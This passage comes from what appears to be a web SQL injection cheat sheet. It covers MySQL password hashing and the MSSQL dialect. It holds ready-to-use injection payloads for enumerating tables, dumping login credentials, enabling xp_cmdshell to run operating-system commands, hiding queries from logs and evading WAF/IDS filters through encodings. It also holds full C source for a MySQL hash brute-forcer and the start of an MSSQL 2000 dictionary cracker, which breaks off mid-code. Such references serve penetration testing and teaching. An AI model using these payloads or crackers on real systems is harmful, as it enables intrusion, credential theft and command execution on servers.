expressions</td></tr><tr><td>&gt;&gt;</td><td>Right shift</td></tr><tr><td>RLIKE</td><td>Synonym for REGEXP</td></tr><tr><td>SOUNDS LIKE</td><td>Compare sounds</td></tr><tr><td>*</td><td>Multiplication operator</td></tr><tr><td>-</td><td>Change the sign of the argument</td></tr><tr><td>XOR</td><td>Logical XOR</td></tr></table><br />    <br /><h2>Constants</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>current_user</td></tr><tr><td>null, \N</td></tr><tr><td>true, false</td></tr></table><br />    <br /><h2>Password Hashing</h2><br />          Prior to MySQL 4.1, password hashes computed by the PASSWORD() function are 16 bytes long. Such hashes look like this:     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>PASSWORD('mypass')</td><td>6f8c114b58f2ce9e</td></tr></table><br />          As of MySQL 4.1, the PASSWORD() function has been modified to produce a longer 41-byte hash value:     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>PASSWORD('mypass')</td><td>*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4</td></tr></table><br />    <br /><h2>Password Cracking</h2><br />          Cain &amp; Abel and John the Ripper are both capable of cracking MySQL 3.x-6.x passwords.     <br />          A Metasploit module for JTR can be found <a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast">here</a>.     <br />    <br /><h3>MySQL &lt; 4.1 Password Cracker</h3><br />          This tool is a high-speed brute-force password cracker for MySQL  hashed passwords. It can break an 8-character password containing any  printable ASCII characters in a matter of hours on an ordinary PC.     <br />                /* This program is public domain. Share and enjoy.<br />*<br />* Example:<br />* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast<br />* $ MySQLfast 6294b50f67eda209<br />* Hash: 6294b50f67eda209<br />* Trying length 3<br />* Trying length 4<br />* Found pass: barf<br />*<br />* The MySQL password hash function could be strengthened considerably<br />* by:<br />* - making two passes over the password<br />* - using a bitwise rotate instead of a left shift<br />* - causing more arithmetic overflows<br />*/<br /><br />#include &lt;stdio.h&gt;<br /><br />typedef unsigned long u32;<br /><br />/* Allowable characters in password; 33-126 is printable ascii */<br />#define MIN_CHAR 33<br />#define MAX_CHAR 126<br /><br />/* Maximum length of password */<br />#define MAX_LEN 12<br /><br />#define MASK 0x7fffffffL<br /><br />int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)<br />{<br />  int i, c;<br />  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;<br />  u32 newstate1, newstate2, newstate3;<br />  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];<br />  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];<br />  i = -1;<br />  sum = 7;<br />  state1_ary[0] = 1345345333L;<br />  state2_ary[0] = 0x12345671L;<br /><br />  while (1) {<br />    while (i &lt; stop) {<br />      i++;<br />      pass_ary[i] = MIN_CHAR;<br />      step_ary[i] = (state1_ary[i] &amp; 0x3f) + sum;<br />      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] &lt;&lt; 8);<br />      sum += MIN_CHAR;<br />      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];<br />      state2_ary[i+1] = state2_ary[i]<br />        + ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);<br />    }<br /><br />    state1 = state1_ary[i+1];<br />    state2 = state2_ary[i+1];<br />    step = (state1 &amp; 0x3f) + sum;<br />    xor1 = step*MIN_CHAR + (state1 &lt;&lt; 8);<br />    xor2 = (state2 &lt;&lt; 8) ^ state1;<br /><br />    for (c = MIN_CHAR; c &lt;= MAX_CHAR; c++, xor1 += step) {<br />      newstate2 = state2 + (xor1 ^ xor2);<br />      newstate1 = state1 ^ xor1;<br /><br />      newstate3 = (targ2 - newstate2) ^ (newstate2 &lt;&lt; 8);<br />      div = (newstate1 &amp; 0x3f) + sum + c;<br />      diff = ((newstate3 ^ newstate1) - (newstate1 &lt;&lt; 8)) &amp; MASK;<br />      if (diff % div != 0) continue;<br />      d = diff / div;<br />      if (d &lt; MIN_CHAR || d &gt; MAX_CHAR) continue;<br /><br />      div = (newstate3 &amp; 0x3f) + sum + c + d;<br />      diff = ((targ1 ^ newstate3) - (newstate3 &lt;&lt; 8)) &amp; MASK;<br />      if (diff % div != 0) continue;<br />      e = diff / div;<br />      if (e &lt; MIN_CHAR || e &gt; MAX_CHAR) continue;<br /><br />      pass_ary[i+1] = c;<br />      pass_ary[i+2] = d;<br />      pass_ary[i+3] = e;<br />      return 1;<br />    }<br /><br />    while (i &gt;= 0 &amp;&amp; pass_ary[i] &gt;= MAX_CHAR) {<br />      sum -= MAX_CHAR;<br />      i--;<br />    }<br />    if (i &lt; 0) break;<br />    pass_ary[i]++;<br />    xor_ary[i] += step_ary[i];<br />    sum++;<br />    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];<br />    state2_ary[i+1] = state2_ary[i]<br />      + ((state2_ary[i] &lt;&lt; 8) ^ state1_ary[i+1]);<br />  }<br /><br />  return 0;<br />}<br /><br />void crack(char *hash)<br />{<br />  int i, len;<br />  u32 targ1, targ2, targ3;<br />  int pass[MAX_LEN];<br /><br />  if ( sscanf(hash, "%8lx%lx", &amp;targ1, &amp;targ2) != 2 ) {<br />    printf("Invalid password hash: %s\n", hash);<br />    return;<br />  }<br />  printf("Hash: %08lx%08lx\n", targ1, targ2);<br />  targ3 = targ2 - targ1;<br />  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);<br />  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);<br />  targ3 = targ2 - ((targ3 &lt;&lt; 8) ^ targ1);<br /><br />  for (len = 3; len &lt;= MAX_LEN; len++) {<br />    printf("Trying length %d\n", len);<br />    if ( crack0(len-4, targ1, targ3, pass) ) {<br />      printf("Found pass: ");<br />      for (i = 0; i &lt; len; i++)<br />        putchar(pass[i]);<br />      putchar('\n');<br />      break;<br />    }<br />  }<br />  if (len &gt; MAX_LEN)<br />    printf("Pass not found\n");<br />}<br /><br />int main(int argc, char *argv[])<br />{<br />  int i;<br />  if (argc &lt;= 1)<br />    printf("usage: %s hash\n", argv[0]);<br />  for (i = 1; i &lt; argc; i++)<br />    crack(argv[i]);<br />  return 0;<br />}<br />				               <br /><h1>MSSQL</h1><br />    <br /><h2>Default Databases</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>pubs</td><td>Not available on MSSQL 2005</td></tr><tr><td>model</td><td>Available in all versions</td></tr><tr><td>msdb</td><td>Available in all versions</td></tr><tr><td>tempdb</td><td>Available in all versions</td></tr><tr><td>northwind</td><td>Available in all versions</td></tr><tr><td>information_schema</td><td>Availalble from MSSQL 2000 and higher</td></tr></table><br />    <br /><h2>Comment Out Query</h2><br />          The following can be used to comment out the rest of the query after your injection:     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>/*</td><td>C-style comment</td></tr><tr><td>--</td><td>SQL comment</td></tr><tr><td>;%00</td><td>Nullbyte</td></tr></table><br />    <br />    <em>Example:</em>         •       SELECT * FROM Users WHERE username = '' OR 1=1 <strong>--</strong>' AND password = '';     <br />     •       SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3<strong>/*</strong>';     <br />        <br /><h2>Testing Version</h2><br />         •       @@VERSION     <br />        <br />    <em>Example:</em>         •       True if MSSQL version is 2008.     <br />     •       SELECT * FROM Users WHERE id = '1' AND <strong>@@VERSION</strong> LIKE '%2008%';     <br />              <em> Note:      </em><br /><em>       •         Output will also contain the version of the Windows Operating System.       <br />      </em>    <br />    <br /><h2>Database Credentials</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>Database..Table</td><td>master..syslogins, master..sysprocesses</td></tr><tr><td>Columns</td><td>name, loginame</td></tr><tr><td>Current User</td><td>user, system_user, suser_sname(), is_srvrolemember('sysadmin')</td></tr><tr><td>Database Credentials</td><td>SELECT user, password FROM master.dbo.sysxlogins</td></tr></table><br />    <br />    <em>Example:</em>         •       Return current user:     <br />     •       SELECT loginame FROM master..sysprocesses WHERE <a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>@SPID;     <br />     <br />     •       Check if user is admin:     <br />     •       SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);     <br />        <br /><h2>Database Names</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>Database.Table</td><td>master..sysdatabases</td></tr><tr><td>Column</td><td>name</td></tr><tr><td>Current DB</td><td>DB_NAME(i)</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT <strong>DB_NAME(5)</strong>;     <br />     •       SELECT <strong>name</strong> FROM <strong>master..sysdatabases</strong>;     <br />        <br /><h2>Server Hostname</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>@@SERVERNAME</td></tr><tr><td>SERVERPROPERTY()</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT <strong>SERVERPROPERTY(</strong>'productversion'<strong>)</strong>, <strong>SERVERPROPERTY(</strong>'productlevel'<strong>)</strong>, <strong>SERVERPROPERTY(</strong>'edition'<strong>)</strong>;     <br />              <em> Note:      </em><br /><em>       •         SERVERPROPERTY() is available from MSSQL 2005 and higher.       <br />      </em>    <br />    <br /><h2>Tables and Columns</h2><br />    <br /><h3>Determining number of columns</h3><br />         <code>      ORDER BY n+1;     </code>        <br />    <em>Example:</em>                Given the query:       <code>        SELECT username, password, permission FROM Users WHERE id = '1';       </code>      <br />     <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1' ORDER BY 1--</td><td>True</td></tr><tr><td>1' ORDER BY 2--</td><td>True</td></tr><tr><td>1' ORDER BY 3--</td><td>True </td></tr><tr><td>1' ORDER BY 4--</td><td>False - Query is only using 3 columns</td></tr><tr><td>-1' UNION SELECT 1,2,3--</td><td>True</td></tr></table><br />              <em> Note:      </em><br /><em>       •         Keep incrementing the number until you get a False response.       <br />      </em>    <br />    <br />          The following can be used to get the columns in the current query.     <br />         <code>      GROUP BY / HAVING     </code>        <br />    <em>Example:</em>                Given the query:       <code>        SELECT username, password, permission FROM Users WHERE id = '1';       </code>      <br />     <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1' HAVING 1=1--</td><td>Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td></tr><tr><td>1' GROUP BY username HAVING 1=1--</td><td>Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td></tr><tr><td>1' GROUP BY username, password HAVING 1=1--</td><td>Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.</td></tr><tr><td>1' GROUP BY username, password, permission HAVING 1=1--</td><td>No Error</td></tr></table><br />              <em> Note:      </em><br /><em>       •         No error will be returned once all columns have been included.       <br />      </em>    <br />    <br /><h3>Retrieving Tables</h3><br />          We can retrieve the tables from two different databases, information_schema.tables or from master..sysobjects.     <br />               •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Tables_Union">Union</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Tables_Blind">Blind</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Tables_Error">Error</a>      <br />                <div class="codebox"><div class="codebox">UNION&nbsp;SELECT&nbsp;name&nbsp;FROM&nbsp;master..sysobjects&nbsp;WHERE&nbsp;xtype='U'</div></div><br />                <div class="codebox"><div class="codebox">AND&nbsp;SELECT&nbsp;SUBSTRING(table_name,1,1)&nbsp;FROM&nbsp;information_schema.tables&nbsp;&gt;&nbsp;'A'</div></div><br />                <table class="table"><col/><tr><th>click me</th></tr><tr><td>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)</td></tr><tr><td>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))</td></tr></table><br />                   <em> Note:      </em><br /><em>       •         Xtype = 'U' is for User-defined tables. You can use 'V' for views.       <br />      </em>    <br />    <br /><h3>Retrieving Columns</h3><br />          We can retrieve the columns from two different databases, information_schema.columns or masters..syscolumns.     <br />               •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Columns_Union">Union</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Columns_Blind">Blind</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MSSQL_Retrieving_Columns_Error">Error</a>      <br />                <div class="codebox"><div class="codebox">UNION&nbsp;SELECT&nbsp;name&nbsp;FROM&nbsp;master..syscolumns&nbsp;WHERE&nbsp;id&nbsp;=&nbsp;(SELECT&nbsp;id&nbsp;FROM&nbsp;master..syscolumns&nbsp;WHERE&nbsp;name&nbsp;=&nbsp;'tablename')</div></div><br />                <div class="codebox"><div class="codebox">AND&nbsp;SELECT&nbsp;SUBSTRING(column_name,1,1)&nbsp;FROM&nbsp;information_schema.columns&nbsp;&gt;&nbsp;'A'</div></div><br />                <table class="table"><col/><tr><th>click me</th></tr><tr><td>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)</td></tr><tr><td>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))</td></tr></table><br />             <br /><h3>Retrieving Multiple Tables/Columns at once</h3><br />          The following 3 queries will create a temporary table/column and  insert all the user-defined tables into it. It will then dump the table  content and finish by deleting the table.     <br />         •       Create Temp Table/Column and Insert Data:     <br />     •       AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @<a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;     <br />             •       Dump Content:     <br />     •       AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);     <br />             •       Delete Table:     <br />     •       AND 1=0; DROP TABLE TMP_DB;     <br />              An easier method is available starting with MSSQL 2005 and higher.  The XML function path() works as a concatenator, allowing the retrieval  of all tables with 1 query.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')</td><td>SQL Server 2005+</td></tr></table><br />          <em> Note:      </em><br /><em>       •         You can encode your query in hex to "obfuscate" your attack.       <br />       •         ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--       <br />      </em>    <br />    <br /><h2>Avoiding the use of quotations</h2><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;*&nbsp;FROM&nbsp;Users&nbsp;WHERE&nbsp;username&nbsp;=&nbsp;&nbsp;CHAR(97)&nbsp;+&nbsp;CHAR(100)&nbsp;+&nbsp;CHAR(109)&nbsp;+&nbsp;CHAR(105)&nbsp;+&nbsp;CHAR(110)</div></div><br />    <br /><h2>String Concatenation</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT CONCAT('a','a','a'); (SQL SERVER 2012)</td></tr><tr><td>SELECT 'a'+'d'+'mi'+'n';</td></tr></table><br />    <br /><h2>Conditional Statements</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>IF</td></tr><tr><td>CASE</td></tr></table><br />    <br />    <em>Examples:</em>         •       <strong>IF</strong> 1=1 SELECT 'true' <strong>ELSE</strong> SELECT 'false';     <br />     •       SELECT <strong>CASE WHEN</strong> 1=1 <strong>THEN</strong> true <strong>ELSE</strong> false <strong>END</strong>;     <br />              <em> Note:      </em><br /><em>       •         IF cannot be used inside a SELECT statement.       <br />      </em>    <br />    <br /><h2>Timing</h2><br />         •       WAITFOR DELAY 'time_to_pass';     <br />     •       WAITFOR TIME 'time_to_execute';     <br />        <br />    <em>Example:</em>         •       IF 1=1 <strong>WAITFOR DELAY '0:0:5'</strong> ELSE <strong>WAITFOR DELAY '0:0:0'</strong>;     <br />        <br /><h2>OPENROWSET Attacks</h2><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;*&nbsp;FROM&nbsp;OPENROWSET('SQLOLEDB',&nbsp;'127.0.0.1';'sa';'p4ssw0rd',&nbsp;'SET&nbsp;FMTONLY&nbsp;OFF&nbsp;execute&nbsp;master..xp_cmdshell&nbsp;"dir"');</div></div><br />    <br /><h2>System Command Execution</h2><br />          Include an extended stored procedure named xp_cmdshell that can be used to execute operating system commands.     <br />         •       EXEC master.dbo.xp_cmdshell 'cmd';     <br />        <br />          Starting with version MSSQL 2005 and higher, xp_cmdshell is  disabled by default, but can be activated with the following queries:     <br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>EXEC sp_configure 'show advanced options', 1</td></tr><tr><td>EXEC sp_configure reconfigure</td></tr><tr><td>EXEC sp_configure 'xp_cmdshell', 1</td></tr><tr><td>EXEC sp_configure reconfigure</td></tr></table><br />    <br />          Alternatively, you can create your own procedure to achieve the same results:     <br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>DECLARE @execmd INT</td></tr><tr><td>EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT</td></tr><tr><td>EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'</td></tr></table><br />    <br />          If the SQL version is higher than 2000, you will have to run additional queries in order the execute the previous command:     <br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>EXEC sp_configure 'show advanced options', 1</td></tr><tr><td>EXEC sp_configure reconfigure</td></tr><tr><td>EXEC sp_configure 'OLE Automation Procedures', 1</td></tr><tr><td>EXEC sp_configure reconfigure</td></tr></table><br />    <br />    <em>Example:</em>         •       Checks to see if xp_cmdshell is loaded, if it is, it checks if it is active and then proceeds to run the 'dir' command and inserts the results into TMP_DB:     <br />     •       ' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--     <br />             •       Dump Content:     <br />     •       ' UNION SELECT tbl FROM TMP_DB--     <br />             •       Delete Table:     <br />     •       ' DROP TABLE TMP_DB--     <br />        <br /><h2>SP_PASSWORD (Hiding Query)</h2><br />          Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure.     <br />         •       SP_PASSWORD     <br />        <br />    <em>Example:</em>         •       ' AND 1=1--<strong>sp_password</strong>     <br />        <br />    <em>Output:</em>         -- 'sp_password' was found in the text of this event.<br />-- The text has been replaced with this comment for security reasons.<br />					        <br /><h2>Stacked Queries</h2><br />          MSSQL supports stacked queries.     <br />    <em>Example:</em>         •       ' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');     <br />        <br /><h2>Fuzzing and Obfuscation</h2><br />    <br /><h3>Allowed Intermediary Characters</h3><br />          The following characters can be used as whitespaces.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>01</td><td>Start of Heading</td></tr><tr><td>02</td><td>Start of Text</td></tr><tr><td>03</td><td>End of Text</td></tr><tr><td>04</td><td>End of Transmission</td></tr><tr><td>05</td><td>Enquiry</td></tr><tr><td>06</td><td>Acknowledge</td></tr><tr><td>07</td><td>Bell</td></tr><tr><td>08</td><td>Backspace</td></tr><tr><td>09</td><td>Horizontal Tab</td></tr><tr><td>0A</td><td>New Line</td></tr><tr><td>0B</td><td>Vertical Tab</td></tr><tr><td>0C</td><td>New Page</td></tr><tr><td>0D</td><td>Carriage Return</td></tr><tr><td>0E</td><td>Shift Out</td></tr><tr><td>0F</td><td>Shift In</td></tr><tr><td>10</td><td>Data Link Escape</td></tr><tr><td>11</td><td>Device Control 1</td></tr><tr><td>12</td><td>Device Control 2</td></tr><tr><td>13</td><td>Device Control 3</td></tr><tr><td>14</td><td>Device Control 4</td></tr><tr><td>15</td><td>Negative Acknowledge</td></tr><tr><td>16</td><td>Synchronous Idle</td></tr><tr><td>17</td><td>End of Transmission Block</td></tr><tr><td>18</td><td>Cancel</td></tr><tr><td>19</td><td>End of Medium</td></tr><tr><td>1A</td><td>Substitute</td></tr><tr><td>1B</td><td>Escape</td></tr><tr><td>1C</td><td>File Separator</td></tr><tr><td>1D</td><td>Group Separator</td></tr><tr><td>1E</td><td>Record Separator</td></tr><tr><td>1F</td><td>Unit Separator</td></tr><tr><td>20</td><td>Space</td></tr><tr><td>25</td><td>%</td></tr></table><br />    <br />    <em>Examples:</em>         •       S<strong>%</strong>E<strong>%</strong>L<strong>%</strong>E<strong>%</strong>C<strong>%</strong>T<strong>%01</strong>column<strong>%02</strong>FROM<strong>%03</strong>table;     <br />     •       A<strong>%%</strong>ND 1=<strong>%%%%%%%%</strong>1;     <br />              <em> Note:      </em><br /><em>       •         The percentage signs in between keywords is only possible on ASP(x) web applications.       <br />      </em>    <br />    <br />          The following characters can be also used to avoid the use of spaces.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>22</td><td>"</td></tr><tr><td>28</td><td>(</td></tr><tr><td>29</td><td>)</td></tr><tr><td>5B</td><td>[</td></tr><tr><td>5D</td><td>]</td></tr></table><br />    <br />    <em>Examples:</em>         •       UNION<strong>(</strong>SELECT<strong>(</strong>column<strong>)</strong>FROM<strong>(</strong>table<strong>))</strong>;     <br />     •       SELECT<strong>"</strong>table_name<strong>"</strong>FROM<strong>[</strong>information_schema<strong>]</strong>.<strong>[</strong>tables<strong>]</strong>;     <br />        <br /><h3>Allowed Intermediary Characters after AND/OR</h3><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>01 - 20</td><td>Range</td></tr><tr><td>21</td><td>!</td></tr><tr><td>2B</td><td>+</td></tr><tr><td>2D</td><td>-</td></tr><tr><td>2E</td><td>.</td></tr><tr><td>5C</td><td>\</td></tr><tr><td>7E</td><td>~</td></tr></table><br />    <br />    <em>Example:</em>         •       SELECT <strong>1F</strong>ROM[table]WHERE<strong>\</strong>1=<strong>\1A</strong>ND<strong>\</strong>1=<strong>\</strong>1;     <br />              <em> Note:      </em><br /><em>       •         The backslash does not seem to work with MSSQL 2000.       <br />      </em>    <br />    <br /><h3>Encodings</h3><br />          Encoding your injection can sometimes be useful for WAF/IDS evasion.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>URL Encoding</td><td>SELECT %74able_%6eame FROM information_schema.tables;</td></tr><tr><td>Double URL Encoding</td><td>SELECT %2574able_%256eame FROM information_schema.tables;</td></tr><tr><td>Unicode Encoding</td><td>SELECT %u0074able_%u6eame FROM information_schema.tables;</td></tr><tr><td>Invalid Hex Encoding (ASP)</td><td>SELECT %tab%le_%na%me FROM information_schema.tables;</td></tr><tr><td>Hex Encoding</td><td>' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--</td></tr><tr><td>HTML Entities (Needs to be verified)</td><td>%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</td></tr></table><br />    <br /><h2>Password Hashing</h2><br />          Passwords begin with 0x0100, the first for bytes following the 0x  are a constant; the next eight bytes are the hash salt and the remaining  80 bytes are two hashes, the first 40 bytes are a case-sensitive hash  of the password, while the second 40 bytes are the uppercase version.     <br />    <div class="codebox"><div class="codebox">0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457</div></div><br />    <br /><h2>Password Cracking</h2><br />          A Metasploit module for JTR can be found <a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast">here</a>.     <br />    <br /><h3>MSSQL 2000 Password Cracker</h3><br />          This tool is designed to crack Microsoft SQL Server 2000 passwords.     <br />                /////////////////////////////////////////////////////////////////////////////////<br />//<br />//           SQLCrackCl<br />//<br />//           This will perform a dictionary attack against the<br />//           upper-cased hash for a password. Once this<br />//           has been discovered try all case variant to work<br />//           out the case sensitive password.<br />//<br />//           This code was written by David Litchfield to<br />//           demonstrate how Microsoft SQL Server 2000<br />//           passwords can be attacked. This can be<br />//           optimized considerably by not using the CryptoAPI.<br />//<br />//           (Compile with VC++ and link with advapi32.lib<br />//           Ensure the Platform SDK has been installed, too!)<br />//<br />//////////////////////////////////////////////////////////////////////////////////<br />#include &lt;stdio.h&gt;<br />#include &lt;windows.h&gt;<br />#include &lt;wincrypt.h&gt;<br />FILE *fd=NULL;<br />char *lerr = "\nLength Error!\n";<br />int wd=0;<br />int OpenPasswordFile(char *pwdfile);<br />int CrackPassword(char *hash);<br />int main(int argc, char *argv[])<br />{<br />	         int err = 0;<br />	    if(argc !=3)<br />	              {<br />	                        printf("\n\n*** SQLCrack *** \n\n");<br />	                        printf("C:\\&gt;%s hash passwd-file\n\n",argv[0]);<br />	                        printf("David Litchfield (<a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>)\n");<br />	                        printf("24th June 2002\n");<br />	                        return 0;<br />	              }<br />	    err = OpenPasswordFile(argv[2]);<br />	    if(err !=0)<br />	     {<br />	       return printf("\nThere was an error opening the password file %s\n",argv[2]);<br />	     }<br />	    err = CrackPassword(argv[1]);<br />	    fclose(fd);<br />	    printf("\n\n%d",wd);<br />	    return 0;<br />}<br />int OpenPasswordFile(char *pwdfile)<br />{<br />	    fd = fopen(pwdfile,"r");<br />	    if(fd)<br />	              return 0;<br />	    else<br />	              return 1;<br />}<br />int CrackPassword(char *hash)<br />{<br />	    char phash[100]="";<br />	    char pheader[8]="";<br />	    char pkey[12]="";<br />	    char pnorm[44]="";<br />	    char pucase[44]="";<br />	    char pucfirst[8]="";<br />	    char wttf[44]="";<br />	    char uwttf[100]="";<br />	    char *wp=NULL;<br />	    char *ptr=NULL;<br />	    int cnt = 0;<br />	    int count = 0;<br />	    unsigned int key=0;<br />	    unsigned int t=0;<br />	    unsigned int address = 0;<br />	    unsigned char cmp=0;<br />	    unsigned char x=0;<br />	    HCRYPTPROV hProv=0;<br />	    HCRYPTHASH hHash;<br />DWORD hl=100;<br />unsigned char szhash[100]="";<br />int len=0;<br />if(strlen(hash) !=94)<br />	      {<br />	              return printf("\nThe password hash is too short!\n");<br />	      }<br />if(hash[0]==0x30 &amp;&amp; (hash[1]== 'x' || hash[1] == 'X'))<br />	      {<br />	              hash = hash + 2;<br />	              strncpy(pheader,hash,4);<br />	              printf("\nHeader\t\t: %s",pheader);<br />	              if(strlen(pheader)!=4)<br />	                        return printf("%s",lerr);<br />	              hash = hash + 4;<br />	              strncpy(pkey,hash,8);<br />	              printf("\nRand key\t: %s",pkey);<br />	              if(strlen(pkey)!=8)<br />	                        return printf("%s",lerr);<br />	              hash = hash + 8;<br />	              strncpy(pnorm,hash,40);<br />	              printf("\nNormal\t\t: %s",pnorm);<br />	              if(strlen(pnorm)!=40)<br />	                        return printf("%s",lerr);<br />	              hash = hash + 40;<br />	              strncpy(pucase,hash,40);<br />	              printf("\nUpper Case\t: %s",pucase);<br />	              if(strlen(pucase)!=40)<br />	                        return printf("%s",lerr);<br />	              strncpy(pucfirst,pucase,2);<br />	              sscanf(pucfirst,"%x",&amp;cmp);<br />	      }<br />else<br />	      {<br />	              return printf("The password hash has an invalid format!\n");<br />	      }<br />printf("\n\n       Trying...\n");<br />if(!CryptAcquireContextW(&amp;hProv, NULL , NULL , PROV_RSA_FULL                 ,0))<br />  {<br />	      if(GetLastError()==NTE_BAD_KEYSET)<br />	              {<br />	                        // KeySet does not exist. So create a new keyset<br />	                        if(!CryptAcquireContext(&amp;hProv,<br />	                                             NULL,<br />	                                             NULL,<br />	                                             PROV_RSA_FULL,<br />	                                             CRYPT_NEWKEYSET ))<br />	                           {<br />	                                    printf("FAILLLLLLL!!!");<br />	                                    return FALSE;<br />	                           }<br />	       }<br />}<br />while(1)<br />	     {<br />	       // get a word to try from the file<br />	       ZeroMemory(wttf,44);<br />	       if(!fgets(wttf,40,fd))<br />	          return printf("\nEnd of password file. Didn't find the password.\n");<br />	       wd++;<br />	       len = strlen(wttf);<br />	       wttf[len-1]=0x00;<br />	       ZeroMemory(uwttf,84);<br />	       // Convert the word to UNICODE<br />	       while(count &lt; len)<br />	                 {<br />	                           uwttf[cnt]=wttf[count];<br />	                           cnt++;<br />	                           uwttf[cnt]=0x00;<br />	                           count++;<br />	                           cnt++;<br />	                 }<br />	       len --;<br />	       wp = &amp;uwttf;<br />	       sscanf(pkey,"%x",&amp;key);<br />	       cnt = cnt - 2;<br />	       // Append the random stuff to the end of<br />	       // the uppercase unicode password<br />	       t = key &gt;&gt; 24;<br />	       x = (unsigned char) t;<br />	       uwttf[cnt]=x;<br />	       cnt++;<br />	       t = key 